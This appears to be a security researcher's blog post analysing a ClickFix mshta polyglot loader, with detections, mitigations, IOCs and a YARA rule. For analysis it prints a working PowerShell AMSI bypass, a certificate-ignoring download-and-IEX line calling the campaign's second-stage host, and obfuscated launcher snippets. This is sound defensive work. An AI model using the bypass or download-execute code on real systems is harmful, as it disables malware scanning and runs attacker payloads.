---
title: "Twelve layers of obfuscation, one AMSI patch: pulling apart a ClickFix mshta loader"
date: 2026-05-24 09:00:00 +1000
categories: [Malware Analysis]
tags: [clickfix, mshta, polyglot, powershell, amsi-bypass, lolbin, application-control, script-block-logging]
description: "A ClickFix campaign drops a 2.4 MB polyglot from prism-vertex[.]com that looks like an MSIX package but parses as an HTA when mshta opens it."
---

*The views and opinions expressed in this post are my own and do not represent those of my employer. This is a personal blog where I share research and things I'm learning.*

> **TL;DR**
>
> A ClickFix campaign is dropping a 2.4 MB polyglot from `prism-vertex[.]com` that looks like a Microsoft MSIX package to a sandbox but parses as an HTA when mshta opens it. JScript decrypts VBScript that spawns PowerShell via the `InternetExplorer.Application` COM moniker, so the PowerShell child is parented to `iexplore.exe`, not `mshta.exe`. The PowerShell stage uses RC4-wrapped reflection strings to patch AMSI in memory, then `IEX`s a second stage from `creativecommunityinfo[.]art`. About 2.4 MB of cleverness wrapping a 4-byte memory write and an HTTPS GET.
>
> **If this is your fleet, do these first:**
>
> - Block `mshta.exe` via Application Control. Event ID **4688** for `mshta.exe` with a `http`/`https` argument is a near-zero-false-positive hunt.
> - Turn on PowerShell Script Block Logging (Event ID **4104**). It captures the cleartext bypass *before* AMSI gets patched.
> - Roll out Constrained Language Mode for non-admin PowerShell. The .NET reflection AMSI bypass dies under CLM.
>
> Full IOCs and the YARA rule are at the bottom.
{: .prompt-tip }

## So a "ZIP file" walks into an mshta

A signal landed on my desk yesterday: "MSHTA Downloading Remote Payload" on a Windows 11 host, parent process `powershell.exe`, command line literally `mshta.exe hxxps://prism-vertex[.]com/8761886`. The interesting bit wasn't the URL - that's just an IOC. It was the parent.

Read it again. A user opened an interactive PowerShell window and ran `mshta.exe` against an external URL. They typed the malware. This is the "ClickFix" pattern - fake CAPTCHA, "verify you're human" overlay, "fix this Word document by running this command" - and it's been the dominant initial-access trick for the better part of a year now. There's no attachment, no exploit, no malicious LNK. Just a webpage and some copy-paste social engineering.

I pulled the file the same way the analyst would: `curl -A "Mozilla/5.0 ..." hxxps://prism-vertex[.]com/8761886 -o possibly_malicious.bin`. `file(1)` immediately had thoughts:

```text
possibly_malicious.bin: Zip archive data, at least v4.5 to extract, compression method=store
```

That's where it got interesting. mshta doesn't open ZIP files. mshta parses HTA/HTML. So either the signal was a false positive, or - and this turned out to be it - the file was lying about what it was. Let's dig in.

## The attack at a glance

1. **Initial access** - ClickFix social engineering: user copy-pastes `mshta.exe <URL>` into their own PowerShell window.
2. **Execution** - mshta downloads a 2.4 MB file with a ZIP/MSIX file signature but parses the embedded `<script>` tags as JScript (it's a polyglot).
3. **Layer 1 (JScript)** - Off-screen window + error suppression + a custom LCG-XOR stream cipher that decrypts an embedded VBScript blob.
4. **Layer 2 (VBScript)** - Hex-decode a base64 string, then `ShellExecute` PowerShell via the **InternetExplorer.Application COM moniker** (so the spawned process appears under IE, not mshta).
5. **Layer 3 (PowerShell)** - Wildcard-globbed PowerShell path + `-EncodedCommand` of UTF-16LE base64.
6. **Layer 4 (PowerShell, final)** - RC4-encrypted reflection strings patch the in-memory AMSI context with `0x41414141`, then `IEX` whatever a second C2 server returns.

That's the whole chain. Roughly 2.4 MB of obfuscation around a 1-line `[Marshal]::WriteInt32(...)` AMSI bypass and a `Net.WebClient.DownloadString` -> `IEX`.

## How it works

### Stage 1 - A file that is, and isn't, a ZIP

The first 512 bytes are textbook ZIP. The local file header at offset 0, the entry name `WidgetsPlatformRuntime-ARM64.msix`, a second entry `Images/SplashScreen.scale-200.png` - this is camouflage built to look like a Microsoft AppX/MSIX package. Run it through a sandbox that tries to unpack the ZIP first and you get plausible-looking PNG data.

But mshta is not a ZIP parser. It's an HTML/script parser. It walks the file, ignores everything that isn't markup, and runs every `<script>` tag it finds. The first one starts at byte 524, and there are **129 of them** scattered through the file. About 85 are pure keyword soup - invalid JavaScript that exists purely to fail to parse:

```javascript
// Block 4, a representative junk block:
/ . ; zljbu private string 22 . else 38 <= < ajf
```

Useless? Not quite. Block 1 sets `window.onerror = function(){ return true }` first, swallowing every parse failure silently. The junk blocks are diluting the real ones, padding the signal-to-noise ratio so that any tool grepping for `<script>` content drowns. Anything stylometric that looks for the *real* code has to find the needle in 80-ish convincing-looking haystacks. That's a nice trick, I'll give it that.

The real blocks set up a couple of helpers (one called `tfsep` that takes integer arguments and assembles strings via `unescape("%" + hex)`), move the HTA window to coordinates `(-29450, 0)` so the user can't see it, and then get to the data.

### Stage 2 - A custom stream cipher in JavaScript

The data is a 271-entry array of hex strings called `panamaVal`. The decoder concatenates 270 of them in a fixed permutation (the 271st is unreachable decoy):

```javascript
togetherTmp = panamaVal[240] + panamaVal[119] + panamaVal[267] + /* ... 268 more ... */ + panamaVal[19];
```

That's 23,298 bytes of ciphertext. The keystream is a hand-rolled linear-congruential generator:

```javascript
// Constants are written as arithmetic so the literals never appear together
rossArr     = [60, 214, 30, 245, 121, 91, 74, 207];   // 8-byte mixing table
jimPaym2    = 18000;   // LCG multiplier
releasesCnt = 3141;    // LCG increment
demList1    = 65536;   // LCG modulus
handlerCnet = 496;     // seed

for (i = 0; i < bytes.length; i++) {
    handlerCnet = (handlerCnet * jimPaym2 + releasesCnt) % demList1;
    out[i] = bytes[i] ^ ((handlerCnet ^ rossArr[i % 8]) % 256);
}
```

A few bytes get sliced off the front of the plaintext (a tamper canary) and the rest is fed to `window.execScript(plaintext, "VBScript")`. That `execScript` method is a legacy IE/HTA API that lets a JScript context hand a string to the VBScript engine without writing it to disk. Modern Edge dropped it years ago. mshta and HTA contexts didn't.

### Stage 3 - VBScript with a parent-process magic trick

What falls out is 23 kB of VBScript that does the same shape of decoding again - hex-pairs to ASCII, ASCII to base64, base64 to a command string - only this time the destination is more interesting:

```vbnet
Set ieMoniker = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set ie        = ieMoniker.Item()
ie.Document.Application.ShellExecute prog, args, "", "open", 0
```

That CLSID is `InternetExplorer.Application`, instantiated via the `new:` COM moniker. Even on Windows 11 - where IE itself is retired - the COM server is still installed for HTA / WebOC compatibility. When the implant `ShellExecute`s through it, the PowerShell child ends up parented to `iexplore.exe` (or the IE broker), not to `mshta.exe`. Any rule that watches `mshta -> powershell` for child-process anomalies misses it. The last argument is `0` (`SW_HIDE`) so there's no window either. Two birds.

The command line that gets shipped to ShellExecute is also obfuscated:

```text
POWerSHEll & (gi C:\W*\S*4\W*\v*\p*ell.exe) -En JABuAGkAcABwAGwAZQA9ACgARwBl...
```

`gi` is `Get-Item`. The wildcard pattern `C:\W*\S*4\W*\v*\p*ell.exe` globs to `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`. Command-line searches looking for the literal string `powershell.exe` don't fire. The `-En` is `-EncodedCommand`, abbreviated so command lines grepping for `-EncodedCommand` also don't fire. Small things, but every little hop knocks out another shallow detection.

### Stage 4 - RC4, AMSI, and the actual point

The `-EncodedCommand` blob (base64 of UTF-16LE) is the final payload. It's about 2.5 kB of cleartext PowerShell, and the bulk of it is two functions: `TenantId`, which is bitwise XOR rewritten via De Morgan's laws so the literal `-bxor` token never appears, and `GlobalJson`, which is RC4 - full 256-byte S-box, KSA, PRGA - using `TenantId` for the byte XOR. The key is `BWJFEesMEqRvjQbm`. The whole RC4 ceremony exists to wrap five base64 strings:

```powershell
"Assembly"
"System.Management.Automation.AmsiUtils"
"amsiContext"
"NonPublic,Static"
0x41414141
```

Plug those into the shape of the payload and the AMSI bypass becomes obvious:

```powershell
[Runtime.InteropServices.Marshal]::WriteInt32(
    [Ref].Assembly
          .GetType("System.Management.Automation.AmsiUtils")
          .GetField("amsiContext", [Reflection.BindingFlags]"NonPublic,Static")
          .GetValue($null),
    [int]0x41414141
)
```

That writes `0x41414141` - the ASCII bytes `AAAA` - over the first DWORD of the `amsiContext` field. The `HAMSICONTEXT` struct begins with a 4-byte signature `'AMSI'` (`0x49534D41`); `AmsiScanBuffer` checks the signature on entry and bails out if it's wrong. Patch the signature, and every subsequent scan in that PowerShell process silently returns `AMSI_RESULT_CLEAN`. The session is deaf to content-based scanning from here on.

The very last lines pull the next stage:

```powershell
$nipple = (Get-FileHash -InputStream ([IO.MemoryStream]::new(
    [Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + $env:USERNAME)
)) -Algorithm MD5).Hash.Substring(0,16).ToLower()

[ServicePointManager]::ServerCertificateValidationCallback = { $true }

$Filter = (New-Object Net.WebClient).DownloadString(
    "hxxps://6ryuefl.creativecommunityinfo[.]art/Cat-91267b64-989f-49b4-89b4-984e0154d4a2"
)
IEX $Filter
```

`$nipple` is a per-host fingerprint - first 16 hex chars of MD5(`COMPUTERNAME + USERNAME`). It's declared and then never used in the visible code, which means the next stage almost certainly consumes it - embedded in a URL path, a header, a task name, something. The actual payload at `creativecommunityinfo[.]art/Cat-<UUID>` is operator-controlled and varies per-poll, per-victim. Whatever it is on the day of the visit, that's what runs. I didn't fetch it - that domain wants nothing to do with my analysis VM's egress.

## Techniques observed (MITRE ATT&CK)

The following techniques have been mapped to MITRE ATT&CK for future reference.

| Tactic | Technique | ATT&CK ID | What it did here |
|--------|-----------|-----------|------------------|
| Initial Access | User Execution: Malicious Copy/Paste | T1204.004 | Victim typed `mshta.exe <URL>` into their own PowerShell window. |
| Execution | System Binary Proxy Execution: Mshta | T1218.005 | mshta is the LOLBin entry point. |
| Execution | Inter-Process Communication: COM | T1559.001 | `new:9BA05972-...-8F39` moniker spawns PowerShell via IE COM. |
| Execution | PowerShell, JavaScript, Visual Basic | T1059.001/.007/.005 | All three engines in one chain. |
| Defense Evasion | Obfuscated Files: Steganography | T1027.003 | ZIP+HTA polyglot disguised as MSIX. |
| Defense Evasion | Encoded Data - multi-layer | T1027.013 | Hex -> ASCII -> base64 -> LCG-XOR -> base64 -> base64-UTF16LE -> RC4. |
| Defense Evasion | Command Obfuscation | T1027.010 | Junk-block dilution; `gi C:\W*\S*...`; De Morgan XOR. |
| Defense Evasion | Hide Artifacts: Hidden Window | T1564.003 | `window.moveTo(-29450, 0)` + `ShellExecute nShowCmd=0`. |
| Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 | `AmsiUtils.amsiContext = 0x41414141`. |
| C2 / Ingress | Application Layer Protocol - Web | T1071.001 / T1105 | `Net.WebClient.DownloadString` over HTTPS with cert validation off. |
| Discovery | System Information Discovery | T1082 | Per-host fingerprint over COMPUTERNAME + USERNAME. |

## Why this matters

The on-disk component of this chain is a single file that looks like an AppX package. There is no second binary on the box. The implant's actual capability - anything from infostealer to full RAT - comes down the wire on every visit from `creativecommunityinfo[.]art/Cat-<UUID>` and is `IEX`'d into the same PowerShell session that has just patched AMSI off. That means: whatever the operator decides to push at the moment your user clicks "verify you are human", that's what runs, in a session that no longer sees content-based scans.

It also matters because the *entry vector* is the user. There's nothing for your email gateway to strip, no attachment to mark-of-the-web, no exploit to patch. You can't patch a copy-paste. What you can do is harden the host so that even if the user types the command, the chain breaks somewhere before AMSI.

## What defenders can do

| Technique (ATT&CK) | What to do | Essential Eight | What to hunt for |
|--------------------|------------|-----------------|------------------|
| mshta proxy execution (T1218.005) | Application control: block `mshta.exe` outright, or scope it to a tiny allowlist of signed HTAs from known locations. Almost no production environment legitimately needs `mshta`. | Application Control (L1+) | Event ID **4688** for `mshta.exe` with a `http://` or `https://` argument, especially when parent is interactive `powershell.exe` / `cmd.exe` / `Run` dialog. |
| ClickFix copy-paste (T1204.004) | Browser-side: enable Smart App Control / SmartScreen for clipboard; deploy a browser extension that warns on cross-origin clipboard writes from the Run dialog pattern. Host-side: app-control catches the *consequence* even when the user types the cause. | Application Control; User Application Hardening | EID **4688** chains where parent is `powershell.exe` or `cmd.exe` with **no command-line arguments** (interactive) and child is `mshta.exe`, `curl.exe`, `wscript.exe`, `cscript.exe`, or `bitsadmin.exe` against a URL. This combo is almost never legitimate. |
| PowerShell (T1059.001) + AMSI bypass (T1562.001) | Enforce PowerShell **Constrained Language Mode** fleet-wide for non-admin users. CLM disables the `[Ref].Assembly.GetType(...).GetField(...)` reflection path the bypass needs and breaks `[Runtime.InteropServices.Marshal]::WriteInt32` entirely. Block `.ps1` from user-writable paths via WDAC/AppLocker. | Application Control; User Application Hardening | **Event ID 4104** (Script Block Logging) captures the cleartext bypass *before* it lands - search for command bodies containing `amsiContext` together with `Marshal]::WriteInt32`. See *Securing PowerShell in the Enterprise* (October 2021) for the maturity framework and *Hardening Microsoft Windows 11 Workstations* (September 2025) for the rollout steps. |
| Visual Basic / WSH (T1059.005) | Disable WSH where it isn't needed via `HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings\Enabled = 0`. If you can't disable, app-control `wscript.exe` and `cscript.exe` to allowed paths only. The same applies to `mshta` and HTAs. | Application Control; User Application Hardening | EID **4688** for `wscript.exe` / `cscript.exe` / `mshta.exe` from `%TEMP%`, `%APPDATA%`, `Downloads`, or against an arbitrary URL. |
| IE-COM parent-process laundering (T1559.001) | Detection only - there's no clean preventative control for `getObject("new:<CLSID>")`. Make sure your EDR's process-creator tracking honours `creator_pid` and `pid_spoofed` flags rather than relying solely on the immediate parent. | No direct E8 home; falls under monitoring maturity. | EID **4688** for `powershell.exe` parented to `iexplore.exe` when there's no real IE process the user is using. Sysmon Event ID **1** with `ParentImage=iexplore.exe` and `Image=powershell.exe`. |
| Polyglot + multi-stage encoding (T1027.003, T1027.013) | Block file downloads where the served `Content-Type` is `application/zip` but the URL has no extension, or where the file passes `file(1)` as ZIP but contains `<script>` tags. This is doable at a web proxy that inspects bodies. | No direct E8 home; gateway / proxy maturity. | Proxy logs for `mshta.exe` user-agent downloads that return non-HTA MIME types. Files in `%LOCALAPPDATA%\Microsoft\Windows\INetCache\` whose body contains both `WidgetsPlatformRuntime-ARM64.msix` and `function tfsep(`. |
| C2 to `.art` / DGA-looking subdomains (T1071.001) | Default-deny egress; proxy with reputation / category enforcement; DNS filtering on newly-registered domains. Block `.art`, `.shop`, `.click`, `.top`, `.work` outright if you can - there are very few legitimate business reasons to talk to them. | No direct E8 home; network architecture. | Proxy logs for `*.creativecommunityinfo[.]art`, `prism-vertex[.]com`, and any 6-8-char random subdomain on a `.art` apex. Periodic `Net.WebClient` GETs to a URL of shape `/Cat-<UUID>`. |

### Take the mshta surface area away

The single highest-value control here is **application control on `mshta.exe`**. The skill in this chain is real - the polyglot trick, the IE COM moniker, the RC4 around the AMSI patch - but it all depends on `mshta` running an external URL in the first place. If your application control rule says "mshta is not allowed", the chain dies on contact, no AMSI bypass needed. **Essential Eight: Application Control.** *Implementing Application Control* (November 2023) covers the rule shapes; you can scope this to `mshta.exe` specifically before doing the broader rollout. Hunt for **Event ID 4688** with `mshta.exe` + `http`/`https` in the command line - that combination is almost universally interesting and the false-positive rate is near zero.

### Turn on Script Block Logging if you haven't already

I will keep beating this drum. Even with AMSI patched mid-script, **Event ID 4104** logs the cleartext body of every script block PowerShell evaluates - including the bypass itself, *before* it lands. The decrypted RC4 strings, the `Marshal::WriteInt32` call, the `creativecommunityinfo[.]art` URL - all of it ends up in `Microsoft-Windows-PowerShell/Operational` for free. It's a Group Policy switch. If 4104 isn't going to your SIEM, fix that this week.

### Constrained Language Mode breaks this attack

PowerShell CLM (`$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"`) disables the .NET reflection surface this bypass relies on. `[Ref].Assembly.GetType(...)`, `[Runtime.InteropServices.Marshal]`, `[System.Net.ServicePointManager]` - all of these become "Type not allowed" errors under CLM. Roll it out via WDAC policy with the script-host enforcement on, and the AMSI patch fails. **Essential Eight: Application Control (Maturity Level 1+); User Application Hardening.** *Securing PowerShell in the Enterprise* (October 2021) describes the maturity framework; *Hardening Microsoft Windows 11 Workstations* (September 2025) has the rollout settings.

### Get serious about egress

Two domains in this chain - `prism-vertex[.]com` (stage 1) and `creativecommunityinfo[.]art` (stage 5). Both look like single-purpose campaign infrastructure. Default-deny outbound from servers, allow-list outbound categories from workstations, and treat HTTP/HTTPS to recently-resolved domains on uncommon TLDs as the loud anomaly it is. **No direct Essential Eight tie-in for egress filtering** - it's general network and monitoring maturity, worth saying out loud.

## Hunting and detection summary

- **EID 4688** for `mshta.exe` invoked with a `http://`/`https://` first argument, especially when parent is `powershell.exe` or `cmd.exe` with no command-line arguments (interactive shell).
- **EID 4104** (Script Block Logging) for command bodies containing the literal string `amsiContext` together with `Marshal]::WriteInt32`. Also search for the De Morgan XOR signature `(-bnot($a -band $b)) -band (-bnot((-bnot $a) -band (-bnot $b)))` - that primitive is shared across this family and is unusual enough that legitimate use is rare.
- **EID 4104** for the RC4 key string `BWJFEesMEqRvjQbm` and for command lines containing `gi C:\W*\S*4\W*\v*\p*ell.exe`.
- **Sysmon Event ID 1** for `powershell.exe` with parent `iexplore.exe`, when no real IE session is active.
- **Proxy logs** for outbound to `prism-vertex[.]com`, `*.creativecommunityinfo[.]art`, or 6-8-character random subdomains on `.art` apexes. Periodic identical-shape `Net.WebClient` GETs to `/Cat-<UUID>` paths.
- **Files** under `%LOCALAPPDATA%\Microsoft\Windows\INetCache\` whose body contains both `WidgetsPlatformRuntime-ARM64.msix` and `function tfsep(`.

## Indicators of Compromise

| Type | Indicator | Notes |
|------|-----------|-------|
| SHA-256 | `da9bd932ffea3bde1243750c092a6f8c6440d4f6380f71e662f37889a5c92c89` | The polyglot file served from `prism-vertex[.]com/8761886`. |
| MD5 | `c80c4ef6c855151cb26cd0bd08fbc77f` | Same file. |
| URL | `hxxps://prism-vertex[.]com/8761886` | Stage 1 entry point. |
| Domain | `prism-vertex[.]com` | Block apex + subdomains. |
| URL | `hxxps://6ryuefl.creativecommunityinfo[.]art/Cat-91267b64-989f-49b4-89b4-984e0154d4a2` | Stage 5 download. |
| Domain | `creativecommunityinfo[.]art` | Block apex + subdomains. |
| URL pattern | `/Cat-<UUID>` on `*.art` | Likely campaign-wide path shape. |
| Decoy filename | `WidgetsPlatformRuntime-ARM64.msix` | First ZIP entry name in the polyglot. |
| Decoy filename | `Images/SplashScreen.scale-200.png` | Second ZIP entry name. |
| RC4 key | `BWJFEesMEqRvjQbm` | Final-stage string protection key. High-fidelity campaign pivot. |
| LCG constants | mul=18000, add=3141, mod=65536, seed=496 | JScript decoder constants. |
| 8-byte mixing table | `3C D6 1E F5 79 5B 4A CF` | JScript decoder. |
| AMSI patch value | `0x41414141` | What `amsiContext` gets overwritten with. |
| Per-host ID algorithm | `MD5($env:COMPUTERNAME + $env:USERNAME)[:16]` | Used somewhere in the unseen stage 5. |

## Detection rules

A YARA rule that matches the polyglot on disk and the decrypted final stage if it lands:

```yara
rule PrismVertex_Polyglot_HTA_Loader
{
    meta:
        author      = "Luke Wilkinson"
        date        = "2026-05-24"
        description = "Polyglot ZIP/MSIX-camouflaged HTA loader from prism-vertex[.]com - JS -> VBS -> PowerShell chain with RC4 AMSI bypass."
        sha256      = "da9bd932ffea3bde1243750c092a6f8c6440d4f6380f71e662f37889a5c92c89"
        severity    = "high"

    strings:
        // Polyglot decoy ZIP entry names
        $decoy_msix    = "WidgetsPlatformRuntime-ARM64.msix" ascii
        $decoy_splash  = "Images/SplashScreen.scale-200.png" ascii

        // JScript decoder fingerprint
        $tfsep_def     = "function tfsep(){var bike=\"\""
        $arr_signature = "panamaVal=[\""
        $lcg_seed      = "handlerCnet=(240+256)"           // = 496
        $lcg_mul       = "jimPaym2=(17973+27)"              // = 18000

        // VBScript stage - IE COM moniker hex-encoded
        $ie_clsid_hex  = "6e65773a39424130353937322d463641382d313143462d413434322d3030413043393041" ascii

        // PowerShell final stage
        $rc4_key       = "BWJFEesMEqRvjQbm" ascii
        $glob_ps       = "gi C:\\W*\\S*4\\W*\\v*\\p*ell.exe" ascii
        $de_morgan_xor = "-bnot(" ascii

        // C2 strings (left fanged so the rule matches real content)
        $stage5_apex   = "creativecommunityinfo.art" ascii
        $stage1_apex   = "prism-vertex.com" ascii

    condition:
        // Polyglot on disk
        (uint32(0) == 0x04034B50 and $decoy_msix and $decoy_splash and $tfsep_def and ($lcg_seed or $lcg_mul))
        or
        // Decrypted PowerShell stage if it ever lands
        ($rc4_key and $glob_ps and $de_morgan_xor)
        or
        // Cleartext C2 strings together
        ($stage1_apex and $stage5_apex)
}
```

## Closing

What I keep coming back to with this one is the ratio. About 2.4 megabytes of clever - polyglot trick, junk-block dilution, hand-rolled LCG-XOR stream cipher, IE COM laundering, wildcard path resolution, De Morgan-disguised XOR, full RC4 - wrapping one `Marshal::WriteInt32` to overwrite four bytes of memory and one `IEX` of an HTTPS response. The point of all that obfuscation is to keep the four-byte write and the HTTPS GET from being seen until they've already happened.

The good news for defenders is that the four-byte write needs PowerShell's .NET reflection surface to land, and PowerShell tells on itself via Script Block Logging *before* AMSI gets patched. Turn that on, turn CLM on, take mshta off the table with application control, and most of the cleverness here lands on nothing. If you take one thing away: **`mshta.exe` + URL + interactive PowerShell parent** is one of the cleanest detection signatures going. Build the rule, deploy it, and the ClickFix family suddenly has a much harder time getting past stage one.

Stay curious.

---

*This post leans on AI more than usual. The signal and the file are mine - I pulled the sample off a real alert and decided it was worth writing up - but the heavy lifting on the static reverse engineering was done by Claude (Anthropic): the multi-layer decoding, the RC4 walkthrough, the AMSI bypass interpretation, and the YARA rule. I directed the investigation, reviewed the findings, and edited the prose. Errors are still mine. If you spot something off, ping me on [X](https://twitter.com/btcoolteam) or [Instagram](https://instagram.com/blueteamcoolteam).*

## References

- MITRE ATT&CK: [T1204.004](https://attack.mitre.org/techniques/T1204/004/), [T1218.005](https://attack.mitre.org/techniques/T1218/005/), [T1559.001](https://attack.mitre.org/techniques/T1559/001/), [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1059.005](https://attack.mitre.org/techniques/T1059/005/), [T1059.007](https://attack.mitre.org/techniques/T1059/007/), [T1027.003](https://attack.mitre.org/techniques/T1027/003/), [T1027.010](https://attack.mitre.org/techniques/T1027/010/), [T1027.013](https://attack.mitre.org/techniques/T1027/013/), [T1564.003](https://attack.mitre.org/techniques/T1564/003/), [T1562.001](https://attack.mitre.org/techniques/T1562/001/), [T1071.001](https://attack.mitre.org/techniques/T1071/001/), [T1105](https://attack.mitre.org/techniques/T1105/), [T1082](https://attack.mitre.org/techniques/T1082/)
- ASD/ACSC: *Implementing Application Control* (November 2023), *Securing PowerShell in the Enterprise* (October 2021), *Hardening Microsoft Windows 11 Workstations* (September 2025), *Essential Eight Maturity Model* (November 2023)
- LOLBAS Project: `mshta.exe`
